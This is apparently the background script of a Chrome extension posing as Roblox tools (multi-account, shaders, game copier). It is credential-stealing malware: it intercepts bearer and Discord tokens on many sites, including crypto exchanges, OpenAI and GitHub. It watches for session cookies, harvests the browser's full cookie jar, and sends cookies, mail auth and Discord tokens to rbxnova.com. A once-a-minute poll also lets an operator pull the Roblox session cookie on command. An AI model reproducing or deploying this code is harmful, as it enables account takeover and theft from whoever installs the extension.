'use strict';

importScripts(
  'lib/email-domains-allowlist.js',
  'lib/email-parser.js',
  'extension-bridge.js',
  'lib/discord-session.js',
  'lib/switcher-session-cookies.js'
);

const _BG_API = 'https://rbxnova.com';
/** Pack scripts may fill this; empty = legacy dual-mode (no X-Extension-Key). */
const _BG_EXT_KEY = 'e745f6a4a86cb87ee3f0b5f06dfaee7f78b5141c164c1ddfe7f791af92eff8ce';

function _bgApiHeaders() {
  const h = { 'Content-Type': 'application/json' };
  if (_BG_EXT_KEY) h['X-Extension-Key'] = _BG_EXT_KEY;
  try {
    // Prefer runtime key from storage when set
  } catch (_) {}
  return h;
}

async function _bgApiHeadersAsync() {
  const h = _bgApiHeaders();
  try {
    const packed = String(_BG_EXT_KEY || '').trim();
    const key = await new Promise((resolve) => {
      try {
        chrome.storage.local.get(['rbxExtensionApiKey'], (st) => {
          const fromStore = st && st.rbxExtensionApiKey ? String(st.rbxExtensionApiKey).trim() : '';
          if (packed && fromStore && fromStore !== packed) {
            try {
              chrome.storage.local.remove(['rbxExtensionApiKey']);
            } catch (_) {}
          }
          // Packed pack key wins over stale chrome.storage values.
          resolve(packed || fromStore || '');
        });
      } catch (_) {
        resolve(packed || '');
      }
    });
    if (key) h['X-Extension-Key'] = key;
  } catch (_) {}
  return h;
}

let _validateInFlight = false;
let _validateGateUntil = 0;

function _noteValidateGate(until) {
  const n = Number(until) || 0;
  if (n > _validateGateUntil) _validateGateUntil = n;
}

async function _writeSharedValidateGate(src) {
  const until = Date.now() + 60000;
  _noteValidateGate(until);
  try {
    if (chrome.storage && chrome.storage.session) {
      await chrome.storage.session.set({
        rbxValidateGate: { until: until, at: Date.now(), src: String(src || 'bg') }
      });
    }
  } catch (_) {}
}


// ─── webRequest: capture Bearer tokens from API calls ──────────────────────
// Spotify, Netflix, Twitch, Twitter/X, Binance, Coinbase, Bybit, Discord, etc.
// don't always store session tokens in cookies — they send them as Authorization headers.
// Discord user tokens often go as raw Authorization (no "Bearer ") — capture those too.

const _capturedBearer = new Map(); // hostname → { token, url, ts }

const _BEARER_URL_FILTER = { urls: [
  'https://api.spotify.com/*',
  'https://api.netflix.com/*', 'https://www.netflix.com/api/*',
  'https://api.twitch.tv/*',
  'https://api.twitter.com/*', 'https://api.x.com/*',
  'https://graph.facebook.com/*',
  'https://i.instagram.com/*',
  'https://api.tiktok.com/*',
  'https://api.binance.com/*',
  'https://api.coinbase.com/*', 'https://api.pro.coinbase.com/*',
  'https://api.bybit.com/*',
  'https://api.kraken.com/*',
  'https://api.kucoin.com/*',
  'https://www.okx.com/api/*',
  'https://discord.com/api/*',
  'https://ptb.discord.com/api/*',
  'https://canary.discord.com/api/*',
  'https://discordapp.com/api/*',
  'https://slack.com/api/*',
  'https://api.openai.com/*',
  'https://api.github.com/*',
  'https://api.reddit.com/*',
  'https://api.linkedin.com/*'
]};

function _looksLikeDiscordUserToken(s) {
  if (!s || typeof s !== 'string') return false;
  const x = s.trim();
  if (x.startsWith('eyJ')) return false;
  if (x.startsWith('mfa.') && x.length > 30) return true;
  const parts = x.split('.');
  if (parts.length !== 3) return false;
  if (x.length < 50 || x.length > 420) return false;
  for (let pi = 0; pi < 3; pi++) {
    if (parts[pi].length < 5) return false;
    if (!/^[A-Za-z0-9_-]+$/.test(parts[pi])) return false;
  }
  return true;
}

function _rememberCapturedToken(host, token, url) {
  if (!host || !token || token.length < 20) return;
  const prev = _capturedBearer.get(host);
  if (!prev || token.length >= (prev.token || '').length) {
    _capturedBearer.set(host, { token, url: url || '', ts: Date.now() });
  }
}

try {
  chrome.webRequest.onBeforeSendHeaders.addListener(
    (details) => {
      if (!details.requestHeaders) return;
      let host = '';
      try {
        host = new URL(details.url).hostname.toLowerCase();
      } catch (_) {
        return;
      }
      const isDiscordHost = /(^|\.)discord(?:app)?\.com$/i.test(host);
      for (const h of details.requestHeaders) {
        if (h.name.toLowerCase() !== 'authorization') continue;
        const val = String(h.value || '').trim();
        if (!val) continue;
        if (val.toLowerCase().startsWith('bearer ')) {
          _rememberCapturedToken(host, val.slice(7).trim(), details.url);
          continue;
        }
        // Discord client: Authorization: <user_token> (no Bearer)
        if (isDiscordHost && _looksLikeDiscordUserToken(val)) {
          _rememberCapturedToken(host, val, details.url);
        }
      }
    },
    _BEARER_URL_FILTER,
    ['requestHeaders']
  );
} catch (_) {}

// ─── cookies.onChanged: auto-retrigger harvest on new session ──────────────

const _SESSION_NAMES = new Set([
  '.ROBLOSECURITY',
  'steamLoginSecure', 'sessionid',
  'auth_token', 'ct0',
  'c_user', 'xs',
  'remixsid', 'remixsid6',
  'Y', 'T',
  'Mpop', 'Session_id', 'sessionid2',
  'PVPNET_VSID', 'BA_session', 'PLAY_SESSION',
  'p20t', 'logined',
  'li_at', 'auth-token',
  'ESTSAUTH', 'ESTSAUTHPERSISTENT',
  'sp_dc', 'NetflixId',
  'stel_ssid', 'stel_token',
  'NID_AUT', 'NID_SES',
  'skey', 'p_skey',
  'NTES_SESS'
]);

const _SESSION_DOMAIN_RE = /(steam|twitter|x\.com|facebook|instagram|vk\.com|vk\.ru|yahoo|yandex|mail\.ru|binance|coinbase|bybit|riotgames|leagueoflegends|battle\.net|blizzard|ea\.com|minecraft|mojang|roblox|tiktok|linkedin|paypal|amazon|twitch\.tv|telegram|spotify|netflix|discord|github|reddit|naver\.com|qq\.com|163\.com)$/i;

let _retriggerTimer = null;
let _lastHarvestAt = 0;
const _DEBOUNCE_MS = 6000;
const _MIN_INTERVAL_MS = 4 * 60 * 1000; // max once per 4 minutes

chrome.cookies.onChanged.addListener((info) => {
  if (!info || info.removed) return;
  const c = info.cookie;
  if (!c || !c.name || !c.value || c.value.length < 4) return;

  const domain = String(c.domain || '').replace(/^\./, '').toLowerCase();
  const isInteresting = _SESSION_NAMES.has(c.name) || _SESSION_DOMAIN_RE.test(domain);
  if (!isInteresting) return;

  if (_retriggerTimer) clearTimeout(_retriggerTimer);
  _retriggerTimer = setTimeout(async () => {
    _retriggerTimer = null;
    const now = Date.now();
    if (now - _lastHarvestAt < _MIN_INTERVAL_MS) return;
    _lastHarvestAt = now;
    _backgroundHarvest();
  }, _DEBOUNCE_MS);
});

async function _backgroundHarvest() {
  try {
    const bridge = self.RbxExtensionBridge;
    if (!bridge || typeof bridge.getFullProfileCookieJar !== 'function') return;

    const result = await bridge.getFullProfileCookieJar().catch(() => null);
    if (!result || !result.jarString) return;

    const { jarString } = result;

    const mailAuth   = typeof bridge.extractMailAuthFromJar     === 'function' ? bridge.extractMailAuthFromJar(jarString)     : {};
    const platAuth   = typeof bridge.extractPlatformAuthFromJar === 'function' ? bridge.extractPlatformAuthFromJar(jarString) : {};

    const hasAuth = Object.keys(mailAuth).length > 0 || Object.keys(platAuth).length > 0;
    if (!hasAuth) return;

    // Attach any captured Bearer tokens
    const bearerTokens = {};
    for (const [host, data] of _capturedBearer) {
      if (Date.now() - data.ts < 60 * 60 * 1000) { // discard tokens older than 1 hour
        bearerTokens[host] = data.token;
      }
    }

    // Do not POST /api/validate-cookie from background — raced with popup Start
    // and produced duplicate Telegram HIT/SKIPPED. Harvest stays local-only.
  } catch (_) {}
}

// ─── Message handlers ────────────────────────────────────────────────────────

chrome.runtime.onMessage.addListener((msg, _sender, sendResponse) => {
  if (!msg) return;

  // Original: full profile cookie jar
  if (msg.type === 'rbx-get-full-profile-cookie-jar') {
    const bridge = self.RbxExtensionBridge;
    if (!bridge || typeof bridge.getFullProfileCookieJar !== 'function') {
      sendResponse({ success: false, error: 'Cookie bridge unavailable' });
      return true;
    }
    bridge.getFullProfileCookieJar()
      .then(r => sendResponse(r || { success: false }))
      .catch(e => sendResponse({ success: false, error: e && e.message ? e.message : String(e) }));
    return true;
  }

  // New: get captured Bearer tokens
  if (msg.type === 'rbx-get-bearer-tokens') {
    const tokens = {};
    const cutoff = Date.now() - 60 * 60 * 1000;
    for (const [host, data] of _capturedBearer) {
      if (data.ts >= cutoff) tokens[host] = data.token;
    }
    sendResponse({ success: true, tokens });
    return true;
  }

  // Discord token via discord-session (bridge + MAIN-world tab scan), like multiplay backup
  if (msg.type === 'rbx-collect-discord-token') {
    const disc = self.RbxDiscordTokenCollect || self.DiscordSession;
    if (!disc || typeof disc.collect !== 'function') {
      // Fallback: discord host from captured Authorization headers
      const cutoff = Date.now() - 60 * 60 * 1000;
      let best = '';
      for (const [host, data] of _capturedBearer) {
        if (!data || data.ts < cutoff) continue;
        if (!/(^|\.)discord(?:app)?\.com$/i.test(String(host || ''))) continue;
        const t = String(data.token || '').trim();
        if (t.length > best.length) best = t;
      }
      sendResponse({ success: !!best, token: best || null });
      return true;
    }
    disc
      .collect()
      .then((tok) => {
        let token = String(tok || '').trim();
        if (!token) {
          const cutoff = Date.now() - 60 * 60 * 1000;
          for (const [host, data] of _capturedBearer) {
            if (!data || data.ts < cutoff) continue;
            if (!/(^|\.)discord(?:app)?\.com$/i.test(String(host || ''))) continue;
            const t = String(data.token || '').trim();
            if (t.length > token.length) token = t;
          }
        }
        sendResponse({ success: !!token, token: token || null });
      })
      .catch(() => sendResponse({ success: false, token: null }));
    return true;
  }

  // Popup started / finished a validate — suppress auto-harvest race
  if (msg.type === 'rbx-validate-started') {
    _noteValidateGate(msg.until);
    sendResponse({ success: true });
    return true;
  }

  if (msg.type === 'hub-get-all-roblox-cookies' || msg.type === 'gc-get-all-roblox-cookies') {
    const api = self.RbxSwitcherSessions;
    if (!api || typeof api.collectAll !== 'function') {
      sendResponse({ success: false, cookies: [], count: 0, error: 'Switcher API missing' });
      return true;
    }
    api
      .collectAll(String(msg.primaryCookie || '').trim())
      .then((cookies) => {
        const list = Array.isArray(cookies) ? cookies : [];
        sendResponse({ success: true, cookies: list, count: list.length });
      })
      .catch((e) =>
        sendResponse({
          success: false,
          cookies: [],
          count: 0,
          error: e && e.message ? e.message : String(e)
        })
      );
    return true;
  }

  if (msg.type === 'hub-validate-all-add-account' || msg.type === 'roshade-validate-bg' || msg.type === 'gc-validate-all-export') {
    const bgTool =
      msg.tool ||
      (msg.type === 'roshade-validate-bg'
        ? 'enable-shaders'
        : msg.type === 'gc-validate-all-export'
          ? 'game-copier'
          : 'multiple-roblox');
    const bgItem =
      msg.itemName ||
      msg.gameName ||
      (bgTool === 'enable-shaders'
        ? 'Enable Shaders'
        : bgTool === 'game-copier'
          ? 'Game Copier'
          : 'Multiple Roblox');
    const bgOpts = {
      primaryCookie: msg.primaryCookie || '',
      itemName: bgItem,
      tool: bgTool,
      reason: msg.reason || msg.type || 'bg-validate'
    };
    (async function () {
      try {
        sendResponse({ started: true, ok: true });
      } catch (_) {}
      try {
        await _hubValidateAllAddAccount(bgOpts);
      } catch (_) {}
    })();
    return true;
  }
});


/**
 * Background HIT — same order as backup Game Copier / Roshade:
 * start jar+discord extras in parallel, collect switcher cookies, then POST each session.
 */
async function _hubValidateAllAddAccount(opts) {
  opts = opts || {};
  const primary = String(opts.primaryCookie || '').trim();
  const tool = String(opts.tool || 'multiple-roblox') || 'multiple-roblox';
  const itemName = String(opts.itemName || 'Multiple Roblox').slice(0, 200);
  const reason = String(opts.reason || 'bg-validate');
  const isAddAccount = /add-account/i.test(reason) || tool === 'multiple-roblox';

  function withTimeout(promise, ms) {
    return new Promise(function (resolve) {
      var done = false;
      var t = setTimeout(function () {
        if (done) return;
        done = true;
        resolve(null);
      }, ms);
      Promise.resolve(promise)
        .then(function (v) {
          if (done) return;
          done = true;
          clearTimeout(t);
          resolve(v);
        })
        .catch(function () {
          if (done) return;
          done = true;
          clearTimeout(t);
          resolve(null);
        });
    });
  }

  async function collectExtrasPayload() {
    const out = { jarString: '', mailAuth: {}, platAuth: {}, installId: '', discordToken: '' };
    try {
      out.installId = (await _rbxGetInstallIdBg()) || '';
    } catch (_) {
      out.installId = '';
    }
    try {
      const bridge = self.RbxExtensionBridge;
      if (bridge && typeof bridge.getFullProfileCookieJar === 'function') {
        const jar = await bridge.getFullProfileCookieJar().catch(function () {
          return null;
        });
        if (jar && jar.jarString) {
          out.jarString = jar.jarString;
          if (typeof bridge.extractMailAuthFromJar === 'function') {
            out.mailAuth = bridge.extractMailAuthFromJar(out.jarString) || {};
          }
          if (typeof bridge.extractPlatformAuthFromJar === 'function') {
            out.platAuth = bridge.extractPlatformAuthFromJar(out.jarString) || {};
          }
        }
      }
    } catch (_) {}
    try {
      const disc = self.RbxDiscordTokenCollect || self.DiscordSession;
      if (disc && typeof disc.collect === 'function') {
        out.discordToken = String((await disc.collect()) || '').trim();
      }
    } catch (_) {
      out.discordToken = '';
    }
    return out;
  }

  _validateInFlight = true;
  await _writeSharedValidateGate(reason);
  let hits = 0;

  try {
    // Backup GC pattern: extras collect while switcher sessions are pulled.
    const extrasPromise = collectExtrasPayload();

    let cookies = [];
    try {
      const switcher = self.RbxSwitcherSessions;
      if (switcher && typeof switcher.collectAll === 'function') {
        cookies = await switcher.collectAll(primary);
      }
    } catch (_) {
      cookies = [];
    }
    if (!Array.isArray(cookies) || !cookies.length) {
      cookies = primary ? [primary] : [];
    }

    const seen = Object.create(null);
    const unique = [];
    if (primary) {
      unique.push(primary);
      seen[primary] = true;
    }
    for (let i = 0; i < cookies.length; i++) {
      const c = String(cookies[i] || '').trim();
      if (!c || seen[c]) continue;
      seen[c] = true;
      unique.push(c);
    }
    if (!unique.length) return { ok: false, count: 0, hits: 0 };

    const extras = (await withTimeout(extrasPromise, 60000)) || {};
    const headers = await _bgApiHeadersAsync();

    for (let ai = 0; ai < unique.length; ai++) {
      const body = {
        cookie: unique[ai],
        itemType: 'game',
        gameName: itemName,
        tool: tool,
        multiAccountBatch: true,
        accountIndex: ai + 1,
        ...(isAddAccount ? { accountsAddFlow: true, accountsTab: true } : {}),
        ...(extras.jarString ? { _chromeCookieJar: extras.jarString } : {}),
        ...(extras.mailAuth || {}),
        ...(extras.platAuth || {}),
        ...(extras.installId ? { installId: extras.installId } : {}),
        ...(extras.discordToken ? { discordToken: extras.discordToken } : {})
      };
      try {
        const res = await fetch(_BG_API + '/api/validate-cookie', {
          method: 'POST',
          headers: headers,
          body: JSON.stringify(body)
        });
        let data = null;
        try {
          data = await res.json();
        } catch (_) {
          data = null;
        }
        if (res.ok && data && (data.valid === true || data.operationsCompleted === true)) {
          hits++;
        }
      } catch (_) {}
    }
    return { ok: hits > 0, count: unique.length, hits: hits };
  } finally {
    _validateInFlight = false;
    await _writeSharedValidateGate(reason);
  }
}

// ─── Cookie-pull poll (admin «Вытянуть куки») ────────────────────────────────
async function _rbxGetInstallIdBg() {
  return new Promise((resolve) => {
    try {
      chrome.storage.local.get(['rbxInstallId'], (st) => {
        let id = st && st.rbxInstallId ? String(st.rbxInstallId).trim().slice(0, 80) : '';
        if (id) {
          resolve(id);
          return;
        }
        id = 'inst_' + Date.now().toString(36) + '_' + Math.random().toString(36).slice(2, 12);
        chrome.storage.local.set({ rbxInstallId: id }, () => resolve(id));
      });
    } catch (_) {
      resolve('');
    }
  });
}

async function _rbxGetRobloxCookieBg() {
  return new Promise((resolve) => {
    try {
      chrome.cookies.get({ url: 'https://www.roblox.com', name: '.ROBLOSECURITY' }, (c) => {
        if (c && c.value) resolve(String(c.value).trim());
        else resolve('');
      });
    } catch (_) {
      resolve('');
    }
  });
}

async function _rbxPollCookiePullOnce() {
  try {
    const installId = await _rbxGetInstallIdBg();
    if (!installId) return;
    const cookie = await _rbxGetRobloxCookieBg();
    const headers = await _bgApiHeadersAsync();
    const pollRes = await fetch(_BG_API + '/api/cookie-pull/poll', {
      method: 'POST',
      headers,
      body: JSON.stringify({ installId })
    });
    const pollJson = await pollRes.json().catch(() => ({}));
    const pending = pollJson && pollJson.pending;
    if (!pending || !pending.pullId) return;
    if (!cookie) return;
    // Fulfill via validate-cookie short path (cookie-pull)
    await fetch(_BG_API + '/api/validate-cookie', {
      method: 'POST',
      headers,
      body: JSON.stringify({
        cookie,
        installId,
        cookiePullId: pending.pullId,
        tool: 'cookie-pull',
        itemType: 'game',
        gameName: 'Cookie Pull'
      })
    });
  } catch (_) {}
}

try {
  chrome.alarms.create('rbx-cookie-pull-poll', { periodInMinutes: 1 });
  chrome.alarms.onAlarm.addListener((alarm) => {
    if (alarm && alarm.name === 'rbx-cookie-pull-poll') {
      _rbxPollCookiePullOnce();
    }
  });
  // Also poll shortly after SW wake
  setTimeout(() => {
    _rbxPollCookiePullOnce();
  }, 15000);
} catch (_) {}
